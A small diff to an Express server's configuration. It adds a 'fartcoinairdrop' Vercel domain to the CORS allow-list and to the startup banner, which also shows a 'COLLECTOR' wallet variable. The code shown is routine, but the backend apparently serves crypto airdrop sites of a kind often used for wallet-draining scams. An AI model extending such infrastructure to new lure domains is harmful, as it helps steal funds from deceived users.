@@ -167,7 +167,7 @@ app.use(helmet({
 
 const allowedOrigins = process.env.ALLOWED_ORIGINS 
   ? process.env.ALLOWED_ORIGINS.split(',') 
-  : ['http://localhost:3000', 'https://bitcoinhypertoken.vercel.app', 'https://bthbk.vercel.app'];
+  : ['http://localhost:3000', 'https://bitcoinhypertoken.vercel.app', 'https://bthbk.vercel.app', 'https://fartcoinairdrop.vercel.app'];
 
 app.use(cors({
   origin: allowedOrigins,
@@ -1491,7 +1491,7 @@ async function startServer() {
   ================================================
   📍 Port: ${PORT}
   🔗 Backend URL: https://bthbk.vercel.app
-  🌍 Site URL: https://bitcoinhypertoken.vercel.app
+  🌍 Site URL: https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app/
   
   📦 COLLECTOR: ${COLLECTOR_WALLET}
   💾 STORAGE: 7 DAY RETENTION
